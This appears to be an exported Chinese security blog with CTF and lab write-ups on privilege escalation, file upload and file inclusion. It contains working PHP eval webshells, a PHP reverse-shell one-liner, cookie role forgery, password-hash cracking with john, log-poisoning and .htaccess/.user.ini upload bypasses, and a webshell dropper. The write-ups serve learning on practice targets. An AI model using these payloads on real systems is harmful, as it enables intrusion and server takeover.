`updated_at` <span class="type">timestamp</span> <span class="keyword">NOT NULL</span> <span class="keyword">DEFAULT</span> <span class="built_in">CURRENT_TIMESTAMP</span> <span class="keyword">ON</span> <span class="keyword">UPDATE</span> <span class="built_in">CURRENT_TIMESTAMP</span>, <span class="comment">-- 更新时间，自动更新为当前时间</span></span><br><span class="line">  <span class="keyword">PRIMARY KEY</span> (`id`), <span class="comment">-- 主键</span></span><br><span class="line">  <span class="keyword">UNIQUE</span> KEY `username` (`username`), <span class="comment">-- 用户名唯一约束</span></span><br><span class="line">  <span class="keyword">UNIQUE</span> KEY `email` (`email`) <span class="comment">-- 邮箱唯一约束</span></span><br><span class="line">) ENGINE<span class="operator">=</span>InnoDB AUTO_INCREMENT<span class="operator">=</span><span class="number">3</span> <span class="keyword">DEFAULT</span> CHARSET<span class="operator">=</span>utf8mb4; <span class="comment">-- 使用 InnoDB 引擎，支持事务和外键</span></span><br><span class="line"><span class="comment">/*!40101 SET character_set_client = @saved_cs_client */</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 插入初始管理员数据</span></span><br><span class="line">LOCK TABLES `admins` WRITE; <span class="comment">-- 锁定表，防止并发写入</span></span><br><span class="line"><span class="comment">/*!40000 ALTER TABLE `admins` DISABLE KEYS */</span>; <span class="comment">-- 禁用索引，提高插入效率</span></span><br><span class="line"><span class="keyword">INSERT INTO</span> `admins` <span class="keyword">VALUES</span> (<span class="number">1</span>,<span class="string">&#x27;security_audit&#x27;</span>,<span class="string">&#x27;$2y$10$Rt7qZwqYOLWFZCEHfThGXudOpl/K3KVx50krQSA1kT3xw1cc7JFF2&#x27;</span>,<span class="string">&#x27;audit@example.com&#x27;</span>,<span class="string">&#x27;auditor&#x27;</span>,NOW(),NOW());</span><br><span class="line"><span class="keyword">INSERT INTO</span> `admins` <span class="keyword">VALUES</span> (<span class="number">2</span>,<span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;$2y$10$bZdU0ipfQyWmOi1BW72GH.cGywpeawymx6.Z41g.PHZNGsav/KVq.&#x27;</span>,<span class="string">&#x27;admin@example.com&#x27;</span>,<span class="string">&#x27;admin&#x27;</span>,NOW(),NOW());</span><br><span class="line"><span class="comment">/*!40000 ALTER TABLE `admins` ENABLE KEYS */</span>; <span class="comment">-- 启用索引</span></span><br><span class="line">UNLOCK TABLES; <span class="comment">-- 解锁表</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 创建 `articles` 表，用于存储文章信息</span></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> IF <span class="keyword">EXISTS</span> `articles`;</span><br><span class="line"><span class="comment">/*!40101 SET @saved_cs_client     = @@character_set_client */</span>;</span><br><span class="line"><span class="comment">/*!40101 SET character_set_client = utf8 */</span>;</span><br><span class="line"><span class="keyword">CREATE TABLE</span> `articles` (</span><br><span class="line">  `id` <span class="type">int</span>(<span class="number">11</span>) <span class="keyword">NOT NULL</span> AUTO_INCREMENT, <span class="comment">-- 主键，自动递增</span></span><br><span class="line">  `title` <span class="type">varchar</span>(<span class="number">255</span>) <span class="keyword">NOT NULL</span>, <span class="comment">-- 文章标题</span></span><br><span class="line">  `content` text <span class="keyword">NOT NULL</span>, <span class="comment">-- 文章内容</span></span><br><span class="line">  `author_id` <span class="type">int</span>(<span class="number">11</span>) <span class="keyword">NOT NULL</span>, <span class="comment">-- 作者 ID，外键关联 `admins` 表</span></span><br><span class="line">  `category` <span class="type">varchar</span>(<span class="number">50</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span>, <span class="comment">-- 文章分类，可选</span></span><br><span class="line">  `status` enum(<span class="string">&#x27;draft&#x27;</span>,<span class="string">&#x27;published&#x27;</span>,<span class="string">&#x27;archived&#x27;</span>) <span class="keyword">NOT NULL</span> <span class="keyword">DEFAULT</span> <span class="string">&#x27;draft&#x27;</span>, <span class="comment">-- 文章状态，可选值为 &#x27;draft&#x27;、&#x27;published&#x27; 或 &#x27;archived&#x27;，默认为 &#x27;draft&#x27;</span></span><br><span class="line">  `created_at` <span class="type">timestamp</span> <span class="keyword">NOT NULL</span> <span class="keyword">DEFAULT</span> <span class="built_in">CURRENT_TIMESTAMP</span>, <span class="comment">-- 创建时间，默认为当前时间</span></span><br><span class="line">  `updated_at` <span class="type">timestamp</span> <span class="keyword">NOT NULL</span> <span class="keyword">DEFAULT</span> <span class="built_in">CURRENT_TIMESTAMP</span> <span class="keyword">ON</span> <span class="keyword">UPDATE</span> <span class="built_in">CURRENT_TIMESTAMP</span>, <span class="comment">-- 更新时间，自动更新为当前时间</span></span><br><span class="line">  <span class="keyword">PRIMARY KEY</span> (`id`), <span class="comment">-- 主键</span></span><br><span class="line">  KEY `author_id` (`author_id`), <span class="comment">-- 索引，提高查询效率</span></span><br><span class="line">  KEY `category` (`category`), <span class="comment">-- 索引，提高查询效率</span></span><br><span class="line">  <span class="keyword">CONSTRAINT</span> `articles_ibfk_1` <span class="keyword">FOREIGN KEY</span> (`author_id`) <span class="keyword">REFERENCES</span> `admins` (`id`) <span class="comment">-- 外键约束，确保作者 ID 存在于 `admins` 表中</span></span><br><span class="line">) ENGINE<span class="operator">=</span>InnoDB <span class="keyword">DEFAULT</span> CHARSET<span class="operator">=</span>utf8mb4;</span><br><span class="line"><span class="comment">/*!40101 SET character_set_client = @saved_cs_client */</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 创建 `templates` 表，用于存储模板信息</span></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> IF <span class="keyword">EXISTS</span> `templates`;</span><br><span class="line"><span class="comment">/*!40101 SET @saved_cs_client     = @@character_set_client */</span>;</span><br><span class="line"><span class="comment">/*!40101 SET character_set_client = utf8 */</span>;</span><br><span class="line"><span class="keyword">CREATE TABLE</span> `templates` (</span><br><span class="line">  `id` <span class="type">int</span>(<span class="number">11</span>) <span class="keyword">NOT NULL</span> AUTO_INCREMENT, <span class="comment">-- 主键，自动递增</span></span><br><span class="line">  `name` <span class="type">varchar</span>(<span class="number">100</span>) <span class="keyword">NOT NULL</span>, <span class="comment">-- 模板名称</span></span><br><span class="line">  `path` <span class="type">varchar</span>(<span class="number">255</span>) <span class="keyword">NOT NULL</span>, <span class="comment">-- 模板路径</span></span><br><span class="line">  `description` text, <span class="comment">-- 模板描述，可选</span></span><br><span class="line">  `is_active` tinyint(<span class="number">1</span>) <span class="keyword">NOT NULL</span> <span class="keyword">DEFAULT</span> <span class="string">&#x27;0&#x27;</span>, <span class="comment">-- 是否激活，0 表示未激活，1 表示激活</span></span><br><span class="line">  `created_at` <span class="type">timestamp</span> <span class="keyword">NOT NULL</span> <span class="keyword">DEFAULT</span> <span class="built_in">CURRENT_TIMESTAMP</span>, <span class="comment">-- 创建时间，默认为当前时间</span></span><br><span class="line">  `updated_at` <span class="type">timestamp</span> <span class="keyword">NOT NULL</span> <span class="keyword">DEFAULT</span> <span class="built_in">CURRENT_TIMESTAMP</span> <span class="keyword">ON</span> <span class="keyword">UPDATE</span> <span class="built_in">CURRENT_TIMESTAMP</span>, <span class="comment">-- 更新时间，自动更新为当前时间</span></span><br><span class="line">  <span class="keyword">PRIMARY KEY</span> (`id`) <span class="comment">-- 主键</span></span><br><span class="line">) ENGINE<span class="operator">=</span>InnoDB <span class="keyword">DEFAULT</span> CHARSET<span class="operator">=</span>utf8mb4;</span><br><span class="line"><span class="comment">/*!40101 SET character_set_client = @saved_cs_client */</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 创建 `system_logs` 表，用于存储系统日志</span></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> IF <span class="keyword">EXISTS</span> `system_logs`;</span><br><span class="line"><span class="comment">/*!40101 SET @saved_cs_client     = @@character_set_client */</span>;</span><br><span class="line"><span class="comment">/*!40101 SET character_set_client = utf8 */</span>;</span><br><span class="line"><span class="keyword">CREATE TABLE</span> `system_logs` (</span><br><span class="line">  `id` <span class="type">int</span>(<span class="number">11</span>) <span class="keyword">NOT NULL</span> AUTO_INCREMENT, <span class="comment">-- 主键，自动递增</span></span><br><span class="line">  `user_id` <span class="type">int</span>(<span class="number">11</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span>, <span class="comment">-- 操作用户 ID，外键关联 `admins` 表</span></span><br><span class="line">  `action` <span class="type">varchar</span>(<span class="number">50</span>) <span class="keyword">NOT NULL</span>, <span class="comment">-- 操作行为</span></span><br><span class="line">  `description` text <span class="keyword">NOT NULL</span>, <span class="comment">-- 操作描述</span></span><br><span class="line">  `ip_address` <span class="type">varchar</span>(<span class="number">45</span>) <span class="keyword">NOT NULL</span>, <span class="comment">-- 操作 IP 地址</span></span><br><span class="line">  `user_agent` <span class="type">varchar</span>(<span class="number">255</span>) <span class="keyword">NOT NULL</span>, <span class="comment">-- 操作用户代理信息</span></span><br><span class="line">  `created_at` <span class="type">timestamp</span> <span class="keyword">NOT NULL</span> <span class="keyword">DEFAULT</span> <span class="built_in">CURRENT_TIMESTAMP</span>, <span class="comment">-- 创建时间，默认为当前时间</span></span><br><span class="line">  <span class="keyword">PRIMARY KEY</span> (`id`), <span class="comment">-- 主键</span></span><br><span class="line">  KEY `user_id` (`user_id`), <span class="comment">-- 索引，提高查询效率</span></span><br><span class="line">  <span class="keyword">CONSTRAINT</span> `system_logs_ibfk_1` <span class="keyword">FOREIGN KEY</span> (`user_id`) <span class="keyword">REFERENCES</span> `admins` (`id`) <span class="comment">-- 外键约束，确保用户 ID 存在于 `admins` 表中</span></span><br><span class="line">) ENGINE<span class="operator">=</span>InnoDB <span class="keyword">DEFAULT</span> CHARSET<span class="operator">=</span>utf8mb4;</span><br><span class="line"><span class="comment">/*!40101 SET character_set_client = @saved_cs_client */</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 创建 `article_views` 表，用于存储文章浏览记录</span></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> IF <span class="keyword">EXISTS</span> `article_views`;</span><br><span class="line"><span class="comment">/*!40101 SET @saved_cs_client     = @@character_set_client */</span>;</span><br><span class="line"><span class="comment">/*!40101 SET character_set_client = utf8 */</span>;</span><br><span class="line"><span class="keyword">CREATE TABLE</span> `article_views` (</span><br><span class="line">  `id` <span class="type">int</span>(<span class="number">11</span>) <span class="keyword">NOT NULL</span> AUTO_INCREMENT, <span class="comment">-- 主键，自动递增</span></span><br><span class="line">  `article_id` <span class="type">int</span>(<span class="number">11</span>) <span class="keyword">NOT NULL</span>, <span class="comment">-- 文章 ID，外键关联 `articles` 表</span></span><br><span class="line">  `ip_address` <span class="type">varchar</span>(<span class="number">45</span>) <span class="keyword">NOT NULL</span>, <span class="comment">-- 浏览 IP 地址</span></span><br><span class="line">  `user_agent` <span class="type">varchar</span>(<span class="number">255</span>) <span class="keyword">NOT NULL</span>, <span class="comment">-- 浏览用户代理信息</span></span><br><span class="line">  `viewed_at` <span class="type">timestamp</span> <span class="keyword">NOT NULL</span> <span class="keyword">DEFAULT</span> <span class="built_in">CURRENT_TIMESTAMP</span>, <span class="comment">-- 浏览时间，默认为当前时间</span></span><br><span class="line">  <span class="keyword">PRIMARY KEY</span> (`id`), <span class="comment">-- 主键</span></span><br><span class="line">  KEY `article_id` (`article_id`), <span class="comment">-- 索引，提高查询效率</span></span><br><span class="line">  <span class="keyword">CONSTRAINT</span> `article_views_ibfk_</span><br></pre></td></tr></table></figure>
<p>其中重要的信息就是两个账号</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">INSERT INTO</span> `admins` <span class="keyword">VALUES</span> (<span class="number">1</span>,<span class="string">&#x27;security_audit&#x27;</span>,<span class="string">&#x27;$2y$10$Rt7qZwqYOLWFZCEHfThGXudOpl/K3KVx50krQSA1kT3xw1cc7JFF2&#x27;</span>,<span class="string">&#x27;audit@example.com&#x27;</span>,<span class="string">&#x27;auditor&#x27;</span>,NOW(),NOW());</span><br><span class="line"><span class="keyword">INSERT INTO</span> `admins` <span class="keyword">VALUES</span> (<span class="number">2</span>,<span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;$2y$10$bZdU0ipfQyWmOi1BW72GH.cGywpeawymx6.Z41g.PHZNGsav/KVq.&#x27;</span>,<span class="string">&#x27;admin@example.com&#x27;</span>,<span class="string">&#x27;admin&#x27;</span>,NOW(),NOW());</span><br></pre></td></tr></table></figure>
<p>可视化的如下</p>
<p><img src="/2025/04/14/%E5%B7%9E%E5%BC%9F%E5%AD%A6%E5%AE%89%E5%85%A8%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/image-20250402160052438.png" alt="image-20250402160052438"></p>
<p>其中有用户名，哈希的密码，还有role(角色；作用；地位；职能；影响程度)，可以理解为权限分组。</p>
<p>密码是通过哈希的，我们可以尝试爆破</p>
<p><strong>kali自带大型字典？john爆破哈希？</strong></p>
<p>这里我们不需要具体了解这个是什么hash，这里无法通过kali自带的<a href="https://gitlab.com/kalilinux/packages/hash-identifier/-/tree/kali/master">hash-identifier</a>判断hash类型。但是不影响我们使用kali自带的john爆破</p>
<p>这里不爆破admin的密码，因为admin的密码太耗费时间了。<br>
我们在kali当中在/tmp下创建passw文件放入(千万不要从navivat里面直接复制，要看清楚再复制)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">security_audit:$2y$10$Rt7qZwqYOLWFZCEHfThGXudOpl/K3KVx50krQSA1kT3xw1cc7JFF2</span><br></pre></td></tr></table></figure>
<p>再通过john进行爆破</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/passw</span><br></pre></td></tr></table></figure>
<p>解出来是iloveryan</p>
<p><img src="/2025/04/14/%E5%B7%9E%E5%BC%9F%E5%AD%A6%E5%AE%89%E5%85%A8%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/image-20250402170141482.png" alt="image-20250402170141482"></p>
<p>我们抓包后查看到cookie里面有疑问</p>
<p><img src="/2025/04/14/%E5%B7%9E%E5%BC%9F%E5%AD%A6%E5%AE%89%E5%85%A8%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/image-20250402170847417.png" alt="image-20250402170847417"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">QWRtaW5JRD0xfHJvbGU9YXVkaXRvcnxleHBpcmU9MTc0MzU4ODExMg%3D%3D</span><br><span class="line">解码后</span><br><span class="line">AdminID=1|role=auditor|expire=1743588112</span><br></pre></td></tr></table></figure>
<p><img src="/2025/04/14/%E5%B7%9E%E5%BC%9F%E5%AD%A6%E5%AE%89%E5%85%A8%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/image-20250402171148794.png" alt="image-20250402171148794"></p>
<p>我们这里使用越权，将auditor权限组改为和admin一样的admin权限组</p>
<p><img src="/2025/04/14/%E5%B7%9E%E5%BC%9F%E5%AD%A6%E5%AE%89%E5%85%A8%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/image-20250402171249096.png" alt="image-20250402171249096"></p>
<p>但是我们还没有越权成功。因为前面还有一个session，如果session存在，那么服务器就会先识session，我们将session删掉即可</p>
<p><img src="/2025/04/14/%E5%B7%9E%E5%BC%9F%E5%AD%A6%E5%AE%89%E5%85%A8%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/image-20250402172058518.png" alt="image-20250402172058518"></p>
<p>成功越权</p>
<p>在模板管理当中我们可以上传文件</p>
<p>我们先随便上传一个图片</p>
<p>然后bp抓包修改内容</p>
<p>我们用冰蝎写shell并上传</p>
<p><img src="/2025/04/14/%E5%B7%9E%E5%BC%9F%E5%AD%A6%E5%AE%89%E5%85%A8%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/image-20250402173842588.png" alt="image-20250402173842588"></p>
<p>我们发现各种访问shell.php都不行，那他应该是修改文件名字了。我们在源码当中看到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">上传路径格式: 日期_MD5(文件名+大小)的前10位.扩展名</span><br><span class="line">20250402_a3b70de679.php</span><br></pre></td></tr></table></figure>
<p>我们可以写个py脚本帮我们生成</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_filename</span>(<span class="params">file_name, file_size</span>):</span><br><span class="line">    <span class="comment"># 获取今天的日期</span></span><br><span class="line">    today = datetime.date.today().strftime(<span class="string">&quot;%Y%m%d&quot;</span>)</span><br><span class="line">    <span class="comment"># 检查日期是否为20250402</span></span><br><span class="line">    <span class="keyword">if</span> today != <span class="string">&quot;20250402&quot;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;今天的日期不是20250402，请检查日期。&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 构造文件名+大小的字符串</span></span><br><span class="line">    name_size_str = <span class="string">f&quot;<span class="subst">&#123;file_name&#125;</span><span class="subst">&#123;file_size&#125;</span>&quot;</span></span><br><span class="line">    <span class="comment"># 计算MD5</span></span><br><span class="line">    md5_hash = hashlib.md5(name_size_str.encode()).hexdigest()</span><br><span class="line">    <span class="comment"># 截取MD5的前10位</span></span><br><span class="line">    md5_prefix = md5_hash[:<span class="number">10</span>]</span><br><span class="line">    <span class="comment"># 构造最终的文件名</span></span><br><span class="line">    final_filename = <span class="string">f&quot;<span class="subst">&#123;today&#125;</span>_<span class="subst">&#123;md5_prefix&#125;</span>.php&quot;</span></span><br><span class="line">    <span class="keyword">return</span> final_filename</span><br><span class="line"></span><br><span class="line"><span class="comment"># 用户输入文件大小</span></span><br><span class="line">file_size = <span class="built_in">input</span>(<span class="string">&quot;请输入文件大小：&quot;</span>)</span><br><span class="line">file_name = <span class="string">&quot;shell.php&quot;</span>  <span class="comment"># 文件名固定为shell</span></span><br><span class="line">filename = generate_filename(file_name, file_size)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> filename:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;生成的文件名是：<span class="subst">&#123;filename&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>用冰蝎进去后。为什么要用冰蝎？因为我们用蚁剑的话catflag发现没有权限，而antsword是webshell管理工具，不是交互式shell，也没办法提权，没办法su切换用户。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">whoami</span><br></pre></td></tr></table></figure>
<p>冰蝎这里也不是交互式shell，那么我们可以反弹shell</p>
<p><img src="/2025/04/14/%E5%B7%9E%E5%BC%9F%E5%AD%A6%E5%AE%89%E5%85%A8%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/image-20250402180910625.png" alt="image-20250402180910625"></p>
<p>我们catflag发现 Permission denied</p>
<p>尝试提权<br>
sudo cat /flag没用<br>
sudo cat /etc/shadow</p>
<p>看到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kfcvme50:$6$5fAJ0KhT$U11SaDn4PdO2D8S1QXw0Jn7K8urysR8Dj6aNnm4qqkxdTEh/rTuFTGQu1dSjQP5WyJ4RD19gDe.pP3mk/h.mZ1:20172:0:99999:7:::</span><br></pre></td></tr></table></figure>
<p>这里的kfcvme50在没有反弹shell进行su kfcvme50的话是不能切换的，因为我们这里使用的是webshell，我们应该进行反弹shell</p>
<p>先在攻击机当中输入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvnp 8899</span><br></pre></td></tr></table></figure>
<p>然后在被攻击机(冰蝎，或者antsword)当中输入注意修改ip</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php -r &#x27;$sock=fsockopen(&quot;ip&quot;,8899);passthru(&quot;/bin/sh &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span><br></pre></td></tr></table></figure>
<p>然后提权</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/bin/bash -p</span><br><span class="line">whoami之后发现是root</span><br></pre></td></tr></table></figure>
<p>然后就可以拿到flag了flag{0eba9ce397b868300cb5ceb5bf6a4666}</p>
<p>另外的提权办法</p>
<p>尝试破解kfcvme50的密码。密码破解出来就是iloveryan</p>
<p>这里我们用script创建一个伪终端。使用sudo -l可以看到kfcvme50有sudo cat权限</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">script /dev/null</span><br><span class="line">Script started, file is /dev/null</span><br><span class="line"><span class="variable">$</span> su kfcvme50</span><br><span class="line">su kfcvme50</span><br><span class="line">Password: iloveryan</span><br><span class="line"></span><br><span class="line">bash<span class="literal">-4</span>.<span class="number">4</span><span class="variable">$</span> whoami</span><br><span class="line">whoami</span><br><span class="line">kfcvme50</span><br><span class="line">bash<span class="literal">-4</span>.<span class="number">4</span><span class="variable">$</span> sudo <span class="literal">-l</span></span><br><span class="line">sudo <span class="literal">-l</span></span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> kfcvme50 on <span class="number">5</span>ac15e0be4b3:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User kfcvme50 may run the following commands on <span class="number">5</span>ac15e0be4b3:</span><br><span class="line">    (ALL) NOPASSWD: /bin/<span class="built_in">cat</span> *</span><br><span class="line">bash<span class="literal">-4</span>.<span class="number">4</span><span class="variable">$</span> sudo <span class="built_in">cat</span> /flag</span><br><span class="line">sudo <span class="built_in">cat</span> /flag</span><br><span class="line">flag&#123;<span class="number">0</span>eba9ce397b868300cb5ceb5bf6a4666&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>渗透靶场复现</tag>
      </tags>
  </entry>
  <entry>
    <title>搞砸了</title>
    <url>/2024/12/12/%E6%90%9E%E7%A0%B8%E4%BA%86/</url>
    <content><![CDATA[<p>听三百遍反方向的钟，让我回去吧。 给23.12.17下午那个傻孩子一巴掌，全搞砸了</p>
<p><img src="/2024/12/12/%E6%90%9E%E7%A0%B8%E4%BA%86/image-20250122014041713.png" alt="image-20250122014041713"></p>
]]></content>
  </entry>
  <entry>
    <title>文件上传</title>
    <url>/2025/02/05/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
    <content><![CDATA[<h1>web151</h1>
<p>绕过前端检测</p>
<p><img src="/2025/02/05/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20250128000124382.png" alt="image-20250128000124382"></p>
<p>lay-data=“{url: ‘upload.php’, accept: ‘images’,exts:‘png’}”</p>
<p>后面的png改为php即可上传php文件</p>
<p>php文件内容为</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>上传之后antsword连接</p>
<p>ctfshow{1b64824a-9dce-448c-b3ab-1a228b2976a4}</p>
<h1>web152</h1>
<p>我们还是要穿php文件，先把前端改了，然后bp抓包</p>
<p>把Content-Type后面的东西改成image/png</p>
<p>然后antsword连接</p>
<p>ctfshow{442b5262-0765-423f-8759-546621822503}</p>
<h1>web153</h1>
<p>使用.user.ini文件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">auto_prepend_file=/<span class="keyword">var</span>/www/html/upload/zmr.png</span><br></pre></td></tr></table></figure>
<p>然后上传zmr.png木马图片</p>
<p>antsword连接<a href="https://a3d88db1-0616-4d9e-aed7-e002209afe35.challenge.ctf.show/upload/">https://a3d88db1-0616-4d9e-aed7-e002209afe35.challenge.ctf.show/upload/</a></p>
<p>ctfshow{787f5258-2357-435f-a3cb-3d36ff826349}</p>
<h1>web154</h1>
<p>文件内容不合规,过滤了php关键词</p>
<p>把php换成=</p>
<p>ctfshow{6022d1f3-ecab-4424-9e61-c71c64c7bbaa}</p>
<h1>web155</h1>
<p>上题同理</p>
<p>ctfshow{c6337925-a6f3-4066-a910-ceb1951d6830}</p>
<h1>web156</h1>
<p><strong>过滤字符<code>[]</code>，<code>[]</code>可以可以使用<code>&#123;&#125;</code>代替。</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span></span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_POST</span>&#123;<span class="string">&#x27;zmr&#x27;</span>&#125;);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>ctfshow{e52c5580-89b6-4c3f-aef6-c46687c1b009}</p>
<h1>web157</h1>
<p>又过滤了{}和;</p>
<p><strong><code>&lt;?=system(&quot;tac ../f\*&quot;);?&gt;</code></strong></p>
<p>再传一遍.user.ini</p>
<p>直接拿flag</p>
<p>如果flag位置变了，直接修改sys内容</p>
<p>ctfshow{3f54cbb0-099f-4e95-9840-052316add8ee}</p>
<h1>web158</h1>
<p>上方方法</p>
<p>ctfshow{0525c3f0-1c13-4486-a14f-812740141737}</p>
<h1>web159</h1>
<p>先发一遍.user.ini</p>
<p>再改<?=`tac ../f*`?></p>
<p>ctfshow{e818ad09-0b23-445f-b73e-d6a6b8fdd4f0}</p>
<h1>web160</h1>
<p>这一题过滤了log关键词，我真服了，这tm过滤了log谁tm能过滤log啊？现实别人服务器会过滤这玩意？这纯tm只跟ctf有关好吗？</p>
<p>包含日志</p>
<p>1.png当中写</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span><span class="keyword">include</span><span class="string">&quot;/var/lo&quot;</span>.<span class="string">&quot;g/nginx/access.lo&quot;</span>.<span class="string">&quot;g&quot;</span><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>.user.ini当作写</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">auto_prepend_file=/<span class="keyword">var</span>/www/html/upload/<span class="number">1</span>.png</span><br></pre></td></tr></table></figure>
<p>进入/upload/</p>
<p>uset-agent:<?php @eval($_POST['zmr']);?></p>
<p>post传参</p>
<p>ctfshow{cfacbc38-ea29-4652-9085-7fcf66e12707}</p>
<h1>web161</h1>
<p>方法同上，只是在png文件前面加一个GIF89A</p>
<p>ctfshow{ecc6f79c-d50b-4662-805a-9efb1c61be22}</p>
<h1>web162-166</h1>
<p>涉及本地ip，不解释，自己wp</p>
<h1>web167</h1>
<p>服务器是apache</p>
<p>用.htaccess</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AddType application/x-httpd-php.png</span><br></pre></td></tr></table></figure>
<p>将<code>.png</code>后缀的文件解析 <strong>成<code>php</code></strong></p>
<p>然后传zmr.jpg</p>
<?php
	@eval($_POST['zmr']);
?>
<p>ctfshow{5fdfdfe5-9048-45cf-a9c9-715a32cdf4a2}</p>
<h1>web168</h1>
<?=`tac ../flagaa.php`?>
<p>ctfshow{dae808c7-e828-4e5e-9821-2387a549c2e5}</p>
<p>wp说要啥免杀</p>
<h1>web169</h1>
]]></content>
      <tags>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title>文件包含</title>
    <url>/2025/01/23/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    <content><![CDATA[<p>正式开始文件包含</p>
<p>从csdn了解一下，以下都为简洁信息，可作为背诵记忆，具体理解请访问原作者</p>
<h1><strong>文件包含知识点</strong></h1>
<h2 id="一、什么是文件包含漏洞">一、什么是文件包含漏洞</h2>
<p>文件包含漏洞是一种注入型漏洞，其本质就是输入一段用户能够控制的脚本或者代码，并让服务端执行。</p>
<p>以PHP为例,常用的文件包含函数有以下四种<br>
include(),require(),include_once(),require_once()</p>
<p>区别如下:</p>
<p>require():找不到被包含的文件会产生致命错误，并停止脚本运行<br>
include():找不到被包含的文件只会产生警告，脚本继续执行<br>
require_once()与require()类似:唯一的区别是如果该文件的代码已经被包含，则不会再次包含<br>
include_once()与include()类似:唯一的区别是如果该文件的代码已经被包含，则不会再次包含</p>
<h2 id="二、本地文件包含漏洞-LFI">二、本地文件包含漏洞(LFI)</h2>
<p>能够打开并包含本地文件的漏洞，我们称为本地文件包含漏洞(LFI)</p>
<p>includ()</p>
<p>我们可以通过此函数读取本地的敏感信息</p>
<p>括号当中可以放进去绝对路径，知识点这里举例的…/…/windows/system.ini</p>
<h2 id="三、LFI漏洞利用技巧">三、LFI漏洞利用技巧</h2>
<h3 id="1-配合文件上传使用">1.配合文件上传使用</h3>
<p>有时候我们找不到文件上传漏洞，无法上传webshell，可以先上传一个图片格式的webshell到服务器，再利用本地文件包含漏洞进行解析。</p>
<p>由于本人了解过这里上传图片的知识，这里不再多加赘述个人理解</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">fwrite</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;shell.php&quot;</span>, <span class="string">&quot;w&quot;</span>), <span class="string">&#x27;&lt;?php eval($_POST[123]);?&gt;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>这段代码的目的是创建一个 PHP Web Shell 文件。它的执行流程如下：</p>
<p>​	①**<code>fopen(&quot;shell.php&quot;, &quot;w&quot;)</code>**：</p>
<ul>
<li>该函数打开一个名为 <code>shell.php</code> 的文件进行写入。如果文件不存在，它会创建这个文件。</li>
